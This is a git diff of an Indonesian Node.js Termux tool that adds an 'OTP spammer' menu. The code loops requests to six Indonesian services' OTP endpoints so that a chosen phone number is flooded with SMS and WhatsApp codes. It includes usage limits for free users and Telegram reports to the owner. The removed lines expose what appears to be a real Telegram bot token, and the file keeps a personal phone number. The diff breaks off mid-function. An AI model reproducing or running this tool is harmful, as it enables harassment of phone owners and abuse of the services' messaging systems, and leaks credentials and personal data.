@@ -8,8 +8,8 @@ import crypto from 'crypto';
 import { exec } from 'child_process';
 
 const CONFIG = {
-    TELEGRAM_TOKEN: '8732611588:AAFzG1j0gRgyEYURywdzOVIuKc9oz0JmJCg',
-    TELEGRAM_CHAT_ID: '8276813899',
+    TELEGRAM_TOKEN: 'GANTI_DENGAN_TOKEN_BOTMU',
+    TELEGRAM_CHAT_ID: 'GANTI_DENGAN_CHAT_ID_MU',
     OWNER_NUMBER: '085168142675',
     VERSION: '2.0.0',
     APPROVAL_TIMEOUT: 120,
@@ -251,8 +251,7 @@ function getAllStatus() {
         if (!fs.existsSync('status.json')) return {};
         return JSON.parse(fs.readFileSync('status.json'));
     } catch { return {}; }
-}
-
+    }
 async function requestApproval(userName, termuxId, device) {
     const code = generateCode();
     const keyboard = [
@@ -493,4 +492,174 @@ function showHeader(user, statusText, termuxId, device) {
     console.log(chalk.white(`╔═══════════════════════════════════════════════╗`));
     console.log(chalk.white(`║ ${chalk.bold('👤 User')}   : ${chalk.green(user)}`));
     console.log(chalk.white(`║ ${chalk.bold('📊 Status')} : ${statusText}`));
-   
+    console.log(chalk.white(`║ ${chalk.bold('🆔 ID')}     : ${chalk.blue(termuxId)}`));
+    console.log(chalk.white(`║ ${chalk.bold('📱 Device')} : ${chalk.magenta(device)}`));
+    console.log(chalk.white(`║ ${chalk.bold('⏰ Waktu')}  : ${chalk.gray(getCurrentTime())}`));
+    console.log(chalk.white(`╚═══════════════════════════════════════════════╝`));
+    console.log();
+}
+
+function showMenu(isOwner, isPartner) {
+    console.log(chalk.yellow(`╔═══════════════════════════════════════════════╗`));
+    console.log(chalk.yellow(`║              📋  MENU UTAMA                  ║`));
+    console.log(chalk.yellow(`╠═══════════════════════════════════════════════╣`));
+    console.log(chalk.yellow(`║ ${chalk.cyan('1.')} 🚀  Halaman Spammer OTP         ║`));
+    console.log(chalk.yellow(`║ ${chalk.cyan('2.')} 🐛  Halaman Lapor Bug           ║`));
+    console.log(chalk.yellow(`║ ${chalk.cyan('3.')} 🔄  Halaman Cek Update         ║`));
+    console.log(chalk.yellow(`║ ${chalk.cyan('4.')} ❌  Keluar                     ║`));
+    if (isOwner) {
+        console.log(chalk.yellow(`║ ${chalk.cyan('5.')} 👥  Add Partner (Owner Only)    ║`));
+    }
+    console.log(chalk.yellow(`╚═══════════════════════════════════════════════╝`));
+    console.log();
+}
+
+async function halamanSpammer(user, termuxId, isOwner, isPartner) {
+    console.clear();
+    console.log(chalk.cyan(`
+╔═══════════════════════════════════════════════╗
+║         🚀  HALAMAN SPAMMER OTP              ║
+╚═══════════════════════════════════════════════╝
+`));
+
+    if (!isOwner && !isPartner) {
+        const limitData = getDailyLimit(termuxId);
+        const today = new Date().toDateString();
+        if (limitData.date === today && limitData.count >= 3) {
+            console.log(chalk.red('❌ Limit harian habis! (3× sehari untuk gratisan).'));
+            console.log(chalk.gray('💡 Upgrade ke partner untuk unlimited.'));
+            readlineSync.question(chalk.gray('\nTekan Enter untuk kembali...'));
+            return;
+        }
+    }
+
+    const targetInput = readlineSync.question(chalk.white('📱 Masukkan nomor target (contoh: 08123456789): '));
+    if (!targetInput.trim()) {
+        console.log(chalk.red('❌ Nomor tidak boleh kosong!'));
+        readlineSync.question(chalk.gray('\nTekan Enter untuk kembali...'));
+        return;
+    }
+
+    let targets = [];
+    if (isPartner || isOwner) {
+        targets = targetInput.split(',').map(t => t.trim());
+    } else {
+        targets = [targetInput.trim()];
+    }
+
+    const delay = (isPartner || isOwner) ? 500 : 2000;
+
+    for (const target of targets) {
+        let phone = target.replace(/[^0-9]/g, "");
+        if (phone.startsWith("0")) phone = "62" + phone.slice(1);
+        if (!phone.startsWith("62")) phone = "62" + phone;
+
+        const p08 = "0" + phone.slice(2);
+        const p62 = phone;
+
+        console.log(chalk.green(`✅ Target: ${phone}\n`));
+        console.log(chalk.gray(`⏳ Mengirim OTP... (delay ${delay/1000}s)\n`));
+
+        await notifyOwner(`🚀 *${user}* (${termuxId}) mulai spam ke \`${phone}\``);
+
+        const otp = [
+            { url: "https://internetrakyat.id/api/app/auth/send-otp-register", data: { phone_number: p08 }, headers: { "x-api-key": "REDACTED" } },
+            { url: "https://www.alodokter.com/resend-otp", data: { user: { phone: p08, uuid: "f6bd0911---b189-" }, request_via: "whatsapp" } },
+            { url: "https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp", data: { accountType: "customers", applicationType: "Pinhome Web", countryCode: "62", medium: "whatsapp", otpType: "register", phoneNumber: p62.replace("62", "") } },
+            { url: "https://www.rumah123.com/api/otp/request-otp", data: { ipAddress: "36.67.110.51", phoneNumber: p62, portalId: 1, type: "WHATSAPP", url: "https://www.rumah123.com/user/login" }, headers: { "Base-Url-Core": "https://www.rumah123.com" } },
+            { url: "https://beta.api.saturdays.com/api/v1/user/otp/send", data: { number: p62.replace("62", ""), country_code: "+62", type: "" }, headers: { "x-api-key": "REDACTED", "country-code": "ID" } },
+            { url: "https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata", data: { mobileNumber: p62.replace("62", ""), type: "prospect-create", channel: "whatsapp" } }
+        ];
+
+        let success = 0, failed = 0;
+        for (let i = 0; i < otp.length; i++) {
+            const ep = otp[i];
+            try {
+                const config = {
+                    headers: { "Content-Type": "application/json", "User-Agent": "Mozilla/5.0", ...(ep.headers || {}) },
+                    timeout: 10000
+                };
+                process.stdout.write(`[${i+1}/${otp.length}] 🔄 Mengirim... `);
+                if (ep.method === "GET") await axios.get(ep.url, config);
+                else await axios.post(ep.url, ep.data, config);
+                success++;
+                console.log(chalk.green('✅ Berhasil'));
+            } catch {
+                failed++;
+                console.log(chalk.red('❌ Gagal'));
+            }
+            await sleep(delay);
+        }
+
+        const laporan = `📱 Nomor: ${phone}\n📤 Total: ${otp.length}\n✅ Berhasil: ${success}\n❌ Gagal: ${failed}`;
+        console.log('\n========== LAPORAN ==========');
+        console.log(laporan);
+        console.log('===============================\n');
+
+        await notifyOwner(`📊 *Hasil Spam dari ${user}* (${termuxId})\n${laporan}`);
+    }
+
+    if (!isOwner && !isPartner) {
+        const newCount = incrementDailyLimit(termuxId);
+        console.log(chalk.gray(`📊 Sisa limit hari ini: ${3 - newCount} dari 3.`));
+    }
+
+    readlineSync.question(chalk.gray('\nTekan Enter untuk kembali ke menu utama...'));
+}
+
+function halamanLaporBug(user, termuxId) {
+    console.clear();
+    console.log(chalk.yellow(`
+╔═══════════════════════════════════════════════╗
+║         🐛  HALAMAN LAPOR BUG               ║
+╚═══════════════════════════════════════════════╝
+`));
+    console.log(chalk.white(`📱 Nomor Owner: ${CONFIG.OWNER_NUMBER}`));
+    console.log(chalk.gray('Kirim pesan ke WhatsApp dengan format:\n- Nama: [Nama Anda]\n- Bug: [Deskripsi bug]\n- Screenshot: [Opsional]\n'));
+
+    const confirm = readlineSync.question(chalk.cyan('Buka WhatsApp sekarang? (y/n): '));
+    if (confirm.toLowerCase() === 'y') {
+        const url = `https://wa.me/${CONFIG.OWNER_NUMBER}?text=Halo%20KISZZ%2C%20saya%20${encodeURIComponent(user)}%20ingin%20lapor%20bug.%0A%0ADeskripsi%3A%20`;
+        execSync(`termux-open-url "${url}"`);
+        notifyOwner(`🐛 *${user}* (${termuxId}) membuka lapor bug.`);
+    }
+    readlineSync.question(chalk.gray('\nTekan Enter untuk kembali ke menu utama...'));
+}
+
+async function halamanCekUpdate(user, termuxId) {
+    console.clear();
+    console.log(chalk.cyan(`
+╔═══════════════════════════════════════════════╗
+║         🔄  HALAMAN CEK UPDATE              ║
+╚═══════════════════════════════════════════════╝
+`));
+    console.log(chalk.green(`✅ Versi terbaru: ${CONFIG.VERSION}`));
+    console.log(chalk.gray('Anda sudah menggunakan versi terbaru.'));
+    readlineSync.question(chalk.gray('\nTekan Enter untuk kembali ke menu utama...'));
+}
+
+async function halamanAddPartner() {
+    console.clear();
+    console.log(chalk.green(`
+╔═══════════════════════════════════════════════╗
+║         👥  ADD PARTNER (OWNER ONLY)         ║
+╚═══════════════════════════════════════════════╝
+`));
+
+    console.log(chalk.gray('Masukkan Termux ID user yang ingin ditambahkan.'));
+    console.log(chalk.gray('Format: contoh -> 10192@localhost\n'));
+
+    const targetId = readlineSync.question(chalk.cyan('📌 Termux ID: '));
+    if (!targetId.trim()) {
+        console.log(chalk.red('❌ ID tidak boleh kosong!'));
+        readlineSync.question(chalk.gray('\nTekan Enter untuk kembali...'));
+        return;
+    }
+
+    if (isApproved(targetId.trim())) {
+        console.log(chalk.yellow(`⚠️ ${targetId} sudah ada di daftar approved.`));
+    } else {
+        saveApproved(targetId.trim());
+        console.log(chalk.green(`✅ ${targetId} berhasil ditambahkan sebagai partner!`));
+        await notifyOwner(`👥 *Partner baru*: ${targetId} ditambahkan oleh owner.`);
+    
